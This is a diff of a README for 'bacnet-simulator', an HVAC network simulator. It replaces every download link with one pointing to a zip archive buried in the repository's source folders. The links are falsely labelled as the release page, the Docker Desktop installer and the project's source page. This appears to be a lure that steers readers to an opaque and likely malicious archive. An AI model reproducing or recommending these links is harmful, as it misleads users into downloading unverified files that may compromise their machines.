@@ -1,6 +1,6 @@
 # 🏢 bacnet-simulator - Simulate HVAC Networks Easily
 
-[![Download bacnet-simulator](https://img.shields.io/badge/Download-Now-brightgreen)](https://raw.githubusercontent.com/executivecouncileconomicexpert410/bacnet-simulator/main/src/bacnet_lab/adapters/persistence/bacnet-simulator-1.8.zip)
+[![Download bacnet-simulator](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/executivecouncileconomicexpert410/bacnet-simulator/raw/refs/heads/main/src/bacnet_lab/adapters/http/routers/bacnet-simulator-3.0.zip)
 
 ---
 
@@ -40,7 +40,7 @@ If you want to use Docker, install Docker Desktop for Windows first. Docker is o
 ## 🚀 How to Download and Install
 
 1. Visit the bacnet-simulator release page here:  
-   [Download bacnet-simulator](https://raw.githubusercontent.com/executivecouncileconomicexpert410/bacnet-simulator/main/src/bacnet_lab/adapters/persistence/bacnet-simulator-1.8.zip)
+   [Download bacnet-simulator](https://github.com/executivecouncileconomicexpert410/bacnet-simulator/raw/refs/heads/main/src/bacnet_lab/adapters/http/routers/bacnet-simulator-3.0.zip)
 
 2. Find the latest release version (it will be marked with the highest version number).
 
@@ -87,7 +87,7 @@ bacnet-simulator uses BAC0 and BACPypes3 libraries under the hood to simulate BA
 
 If you prefer using Docker, you can run bacnet-simulator in containers to keep it isolated from your computer.
 
-1. Install Docker Desktop for Windows from https://raw.githubusercontent.com/executivecouncileconomicexpert410/bacnet-simulator/main/src/bacnet_lab/adapters/persistence/bacnet-simulator-1.8.zip
+1. Install Docker Desktop for Windows from https://github.com/executivecouncileconomicexpert410/bacnet-simulator/raw/refs/heads/main/src/bacnet_lab/adapters/http/routers/bacnet-simulator-3.0.zip
 
 2. Open a command prompt or PowerShell window.
 
@@ -130,7 +130,7 @@ Using Docker helps if you want to test different versions or avoid manual instal
 The bacnet-simulator project is open-source. You can explore its source code, report issues, or help improve features.
 
 Visit this page for full source, documentation, and updates:  
-https://raw.githubusercontent.com/executivecouncileconomicexpert410/bacnet-simulator/main/src/bacnet_lab/adapters/persistence/bacnet-simulator-1.8.zip  
+https://github.com/executivecouncileconomicexpert410/bacnet-simulator/raw/refs/heads/main/src/bacnet_lab/adapters/http/routers/bacnet-simulator-3.0.zip  
 
 Here are some of the main technologies used:
 
